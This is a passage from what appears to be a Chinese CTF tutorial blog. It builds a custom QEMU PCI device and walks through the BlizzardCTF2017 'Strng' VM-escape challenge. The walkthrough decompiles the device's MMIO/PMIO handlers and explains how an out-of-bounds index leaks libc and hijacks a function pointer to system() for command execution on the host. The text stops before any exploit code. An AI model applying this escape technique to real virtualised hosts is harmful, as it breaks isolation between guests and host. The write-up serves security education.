class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">strng_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint64_t</span> val = ~<span class="number">0ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        val = strng-&gt;addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">        val = strng-&gt;regs[strng-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> saddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        strng-&gt;addr = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">        saddr = strng-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">switch</span> (saddr) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            strng-&gt;srand(val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand_r(&amp;strng-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_pmio_ops = &#123;</span><br><span class="line">    .read = strng_pmio_read,</span><br><span class="line">    .write = strng_pmio_write,</span><br><span class="line">    .endianness = DEVICE_LITTLE_ENDIAN,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="初始化函数"><a href="#初始化函数" class="headerlink" title="初始化函数"></a>初始化函数</h3><p>然后是<strong>设备实例的初始化函数</strong>，在 <code>PCIDeviceClass</code> 当中定义了一个名为 <code>realize</code> 的函数指针，当 PCI 设备被载入时便会调用这个函数指针指向的函数来初始化</p><p>这里我们也定义一个自己的初始化函数，不过我们需要做的工作其实基本上就只有初始化两个 <code>MemoryRegion</code>，<code>memory_region_init_io()</code> 会为这两个 <code>MemoryRegion</code> 进行初始化的工作，并设置函数表为我们指定的函数表，<code>pci_register_bar()</code> 则用来注册 BAR:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;mmio, OBJECT(strng), &amp;strng_mmio_ops, strng, <span class="string">&quot;strng-mmio&quot;</span>, STRNG_MMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;strng-&gt;mmio);</span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;pmio, OBJECT(strng), &amp;strng_pmio_ops, strng, <span class="string">&quot;strng-pmio&quot;</span>, STRNG_PMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;strng-&gt;pmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是 Class 与 Object（也就是 instance）的初始化函数，这里需要注意的是在 Class 的初始化函数中我们应当设置父类 <code>PCIDeviceClass</code> 的一系列基本属性（也就是 PCI 设备的基本属性）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_instance_init</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = STRNG(obj);</span><br><span class="line"></span><br><span class="line">    strng-&gt;srand = srand;</span><br><span class="line">    strng-&gt;rand = rand;</span><br><span class="line">    strng-&gt;rand_r = rand_r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    k-&gt;realize = pci_strng_realize;</span><br><span class="line">    k-&gt;vendor_id = PCI_VENDOR_ID_QEMU;</span><br><span class="line">    k-&gt;device_id = <span class="number">0x11e9</span>;</span><br><span class="line">    k-&gt;revision = <span class="number">0x10</span>;</span><br><span class="line">    k-&gt;class_id = PCI_CLASS_OTHERS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h3><p>最最最后就是为我们的 PCI 设备类型注册 TypeInfo </p><p>有时候需要接口中增加PCI 的接口:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_register_types</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">const</span> TypeInfo strng_info = &#123;</span><br><span class="line">        .name          = <span class="string">&quot;strng&quot;</span>,</span><br><span class="line">        .parent        = TYPE_PCI_DEVICE,</span><br><span class="line">        .instance_size = <span class="keyword">sizeof</span>(STRNGState),</span><br><span class="line">        .instance_init = strng_instance_init,</span><br><span class="line">        .class_init    = strng_class_init,</span><br><span class="line"> <span class="comment">/*     .interfaces = (InterfaceInfo[]) &#123;</span></span><br><span class="line"><span class="comment">        &#123; INTERFACE_CONVENTIONAL_PCI_DEVICE &#125;,</span></span><br><span class="line"><span class="comment">        &#123; &#125;,</span></span><br><span class="line"><span class="comment">    &#125;,   */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    type_register_static(&amp;strng_info);</span><br><span class="line">&#125;</span><br><span class="line">type_init(pci_strng_register_types)</span><br></pre></td></tr></table></figure><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>将编写好的源码放置于<code>hw/misc/a3dev.c</code>目录</p><p>在 meson 构建系统中加入我们新增的这个设备，在 <code>hw/misc/meson.build</code> 中加入如下语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">softmmu_ss.add(when: <span class="string">&#x27;CONFIG_PCI_STRNG&#x27;</span>, if_true: files(<span class="string">&#x27;strng.c&#x27;</span>))</span><br></pre></td></tr></table></figure><p>并在 <code>hw/misc/Kconfig</code> 中添加如下内容，这表示我们的设备会在 <code>CONFIG_PCI_DEVICES=y</code> 时编译：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config PCI_STRNG</span><br><span class="line">    <span class="type">bool</span></span><br><span class="line">    <span class="keyword">default</span> y <span class="keyword">if</span> PCI_DEVICES</span><br><span class="line">    depends on PCI</span><br></pre></td></tr></table></figure><p>之后编译 Qemu 并附加上 <code>-device strng</code> ，之后随便起一个 Linux 系统，此时使用 <code>lspci</code> 指令我们便能看到我们新添加的 pci 设备：</p><h1 id="QEMU逃逸"><a href="#QEMU逃逸" class="headerlink" title="QEMU逃逸"></a>QEMU逃逸</h1><p>QEMU 逃逸本质上和用户态的 Pwn 题没有太大区别，只不过呈现形式略有不同。题目本身通常以一个 QEMU 模拟设备的形式进行呈现，该设备通常会实现一些功能并提供用户可操纵的 MMIO/PMIO 接口。选手通常需要编写一个与这些接口进行交互的程序并传到远程主机上运行以完成利用（类似于内核 Pwn）。</p><p>几乎所有的 CTF QEMU Pwn 题都是自定义一个设备并定义相应的 MMIO/PMIO 操作。</p><h2 id="BlizzardCTF2017-Strng"><a href="#BlizzardCTF2017-Strng" class="headerlink" title="BlizzardCTF2017 - Strng"></a>BlizzardCTF2017 - Strng</h2><p>题目的源码之前分析过,但实际做题的时候是没给源码的</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>在启动脚本中发现添加了一个自定义设备</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./qemu-system-x86_64 \</span><br><span class="line">    -m 1G \</span><br><span class="line">    -device strng \</span><br><span class="line">    -hda my-disk.img \</span><br><span class="line">    -hdb my-seed.img \</span><br><span class="line">    -nographic \</span><br><span class="line">    -L pc-bios/ \</span><br><span class="line">    -enable-kvm \</span><br><span class="line">    -device e1000,netdev=net0 \</span><br><span class="line">    -netdev user,<span class="built_in">id</span>=net0,hostfwd=tcp::5555-:22</span><br></pre></td></tr></table></figure><p>ida打开qemu文件,ida加载要有一会,加载符号那里记得选择确定,不然有很多符号会缺失</p><p>之后在字符串窗口搜索字符串strng</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000063E3D800000023C/home/rcvalle/qemu/hw/misc/strng.c</span><br><span class="line">.rodata:000000000063E3FB0000000BCstrng-mmio</span><br><span class="line">.rodata:000000000063E4060000000BCstrng-pmio</span><br><span class="line">.rodata:000000000063E41100000006Cstrng</span><br><span class="line">.rodata:000000000063E42000000014Cstrng_instance_init</span><br><span class="line">.rodata:000000000063E44000000011Cstrng_class_init</span><br></pre></td></tr></table></figure><p>结合这些信息,可以在函数栏搜索对应函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">pci_strng_realize</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  memory_region_init_io(a1 + <span class="number">2288</span>, a1, strng_mmio_ops, a1, <span class="string">&quot;strng-mmio&quot;</span>, <span class="number">256LL</span>);</span><br><span class="line">  pci_register_bar(a1, <span class="number">0LL</span>, <span class="number">0LL</span>, a1 + <span class="number">2288</span>);</span><br><span class="line">  memory_region_init_io(a1 + <span class="number">2544</span>, a1, strng_pmio_ops, a1, <span class="string">&quot;strng-pmio&quot;</span>, <span class="number">8LL</span>);</span><br><span class="line">  <span class="keyword">return</span> pci_register_bar(a1, <span class="number">1LL</span>, <span class="number">1LL</span>, a1 + <span class="number">2544</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现注册了mmio处理与pmio处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">strng_mmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)opaque + (addr &gt;&gt; <span class="number">2</span>) + <span class="number">701</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>opaque</code> 参数其实就是设备加载时动态分配的 <code>PCIDevice</code> 类的一个自定义子类。</p><p>在 <code>(u32*)opaque[701]</code> 处存在一个 <code>unsigned int</code> 数组（这里我们称为 <code>opaque-&gt;buf</code>）</p><p>MMIO 的 read 主要是简单的读取 <code>opaque-&gt;buf[(addr &gt;&gt; 2)]</code> 上的 4 字节内容，看起来似乎可以存在一个越界读取，但是<strong>在 QEMU 内部会检查 MR 访问范围（addr）是否超过定义的内存范围，所以其实是没法进行越界读取的</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">strng_mmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  hwaddr v4; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> vala; <span class="comment">// [rsp+8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> &amp;&amp; (addr &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)opaque + <span class="number">702</span>) = (*((__int64 (__fastcall **)(<span class="type">void</span> *, hwaddr, <span class="type">uint64_t</span>))opaque + <span class="number">384</span>))(opaque, v4, val);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v4 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        vala = val;</span><br><span class="line">        v5 = (*((__int64 (__fastcall **)(<span class="type">char</span> *))opaque + <span class="number">385</span>))((<span class="type">char</span> *)opaque + <span class="number">2812</span>);</span><br><span class="line">        LODWORD(val) = vala;</span><br><span class="line">        *((_DWORD *)opaque + <span class="number">704</span>) = v5;</span><br><span class="line">      &#125;</span><br><span class="line">      *((_DWORD *)opaque + (<span class="type">unsigned</span> <span class="type">int</span>)v4 + <span class="number">701</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      (*((<span class="type">void</span> (__fastcall **)(_QWORD))opaque + <span class="number">383</span>))((<span class="type">unsigned</span> <span class="type">int</span>)val);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>地址为 <code>0</code>：将 <code>(u64*)opaque[383]</code> 处数据作为函数指针进行调用，参数为传入的值</li><li>地址为 <code>1 &lt;&lt; 2</code>：将 <code>(u64*)opaque[384]</code> 处数据作为函数指针进行调用，并将结果写入 <code>opaque-&gt;buf[3]</code></li><li>地址为 <code>其他值 &lt;&lt; 2</code>：在 <code>opaque-&gt;buf[(addr&gt;&gt;2)]</code> 处写入传入的值</li><li>若地址为 <code>3 &lt;&lt; 2</code>，则会在此之前将 <code>(u64*)opaque[385]</code> 处数据作为函数指针进行调用，参数为 <code>&amp;((char*)opaque[2812])</code> ，并往 <code>opaque-&gt;buf[3]</code> 写入传入的值</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> __fastcall <span class="title function_">strng_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">-1LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = *((_DWORD *)opaque + <span class="number">700</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v4 &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)opaque + (v4 &gt;&gt; <span class="number">2</span>) + <span class="number">701</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> *((<span class="type">unsigned</span> <span class="type">int</span> *)opaque + <span class="number">700</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PMIO 的 read 功能则是进行数据读取：</p><ul><li>若 <code>addr == 0</code> ，则返回 <code>(unsigned int *)opaque[700]</code> 的值。</li><li>若 <code>addr == 4</code> ，则获取 <code>(unsigned int *)opaque[700]</code> 的值 <code>v4</code>，若低 2 位为 0 则返回 <code>opaque-&gt;buf[(v4 &gt;&gt; 2)]</code> 上数据。</li></ul><p>若我们能够控制 <code>(unsigned int *)opaque[700]</code> 的值，则可以直接完成一个越界读。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">strng_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( size == <span class="number">4</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( addr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( addr == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = *((_DWORD *)opaque + <span class="number">700</span>);</span><br><span class="line">        <span class="keyword">if</span> ( (v4 &amp; <span class="number">3</span>) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v5 = v4 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">1</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_DWORD *)opaque + <span class="number">702</span>) = (*((__int64 (__fastcall **)(<span class="type">void</span> *, __int64, <span class="type">uint64_t</span>))opaque + <span class="number">384</span>))(</span><br><span class="line">                                          opaque,</span><br><span class="line">                                          <span class="number">4LL</span>,</span><br><span class="line">                                          val);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( (_DWORD)v5 )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( (_DWORD)v5 == <span class="number">3</span> )</span><br><span class="line">              *((_DWORD *)opaque + <span class="number">704</span>) = (*((__int64 (__fastcall **)(<span class="type">char</span> *, __int64, <span class="type">uint64_t</span>))opaque + <span class="number">385</span>))(</span><br><span class="line">                                            (<span class="type">char</span> *)opaque + <span class="number">2812</span>,</span><br><span class="line">                                            <span class="number">4LL</span>,</span><br><span class="line">                                            val);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">              *((_DWORD *)opaque + v5 + <span class="number">701</span>) = val;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            (*((<span class="type">void</span> (__fastcall **)(_QWORD))opaque + <span class="number">383</span>))((<span class="type">unsigned</span> <span class="type">int</span>)val);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *((_DWORD *)opaque + <span class="number">700</span>) = val;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PMIO 的 write 功能定义如下：</p><ul><li>若 <code>addr == 0</code>，则将传入的值写入 <code>(unsigned int *)opaque[700]</code> ，因此结合 PMIO read 我们便可以完成越界读。</li><li>若 <code>addr == 4</code>，则获取 <code>(unsigned int *)opaque[700]</code> 的值 <code>v4</code>，若低 2 位为 0 则取 <code>v5 = v4 &gt;&gt;2</code>：</li><li>若 <code>v5 == 1</code>，则调用 <code>(u64*)opaque[384]</code> 处函数指针，返回值写入 <code>opaque-&gt;buf[1]</code>，参数见代码</li><li>若 <code>v5 == 3</code>，则调用 <code>(u64*)opaque[385]</code> 处函数指针，返回值写入 <code>opaque-&gt;buf[3]</code>，参数见代码</li><li>若 <code>v5 != 0</code>，则将传入的值写入 <code>opaque-&gt;buf[v5]</code></li><li>若 <code>v5 == 1</code>，则调用 <code>(u64*)opaque[383]</code> 处函数指针，参数为我们传入的值</li></ul><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>由于 PMIO read 功能的读取地址由 <code>(unsigned int *)opaque[700]</code> 决定，而该值可以通过 PMIO write 写入 <code>addr == 0</code> 处进行修改</p><p>由于题目一开始便在 <code>opaque</code> 靠后的放置了一些<strong>libc指针</strong>，因此我们可以通过读取这些函数指针泄露 libc 基址。</p><p>同样地，当 <code>addr == 4</code> 时，PMIO write 会向指定地址 + 偏移处写入数据，而该偏移值为我们可控的 <code>(unsigned int *)opaque[700]</code>，因此我们可以非常方便地劫持 <code>opaque</code> 上的函数指针，而这些函数指针又可以通过 MMIO write 与 PMIO write 进行触发，因此不难想到的是我们可以通过劫持这些函数指针来完成控制流劫持。</p><p>当 <code>(unsigned int *)opaque[700] == 3</code> 时，调用函数指针会传入一个 <code>opaque</code> 上地址作为第一个参数，而该处数据同样是我们可控的，因此我们可以在该处先写入字符串后再劫持函数指针为 <code>system()</code> 后直接调用即可完成 Host 上的任意命令执行。</p><h3 id="交互"><a href="#交互" class="headerlink" title="交互"></a>交互</h3><p>QEMU pwn 题会提供给我们一个 local Linux 环境，通常都有着 root 权限（除了一些套娃题目会要求选手先完成提权），通常我们需要使用 C 编写 exp，将其进行静态编译后传输到远程运行。有的题目也会提供本地编译环境（例如本题），这样我们便只需要传输 exp 的源代码到远程再编译运行即可。</p><p>首先说一下与题目进行交互的方式。QEMU pwn 的漏洞通常出现在一个自定义 PCI 设备中，我们可以通过 <code>lspci</code> 命令查看现有的 PCI 设备，在每个设备开头都可以看到形如 <code>xx:yy.z</code> 的十六进制编号，这个格式其实是 <code>总线编号:设备编号.功能编号</code>，当我们使用 <code>lspci -v</code>查看 PCI 设备信息时，在总线编号前面的 4 位数字便是 PCI 域的编号。</p><p>通常我们可以看到一个未被识别的设备，这通常便是题目设备。这里我们可以看到 PMIO 地址为 <code>0xc050</code>，MMIO 地址（物理地址）为 <code>0xfebf1000</code>：</p><figure class="highlight 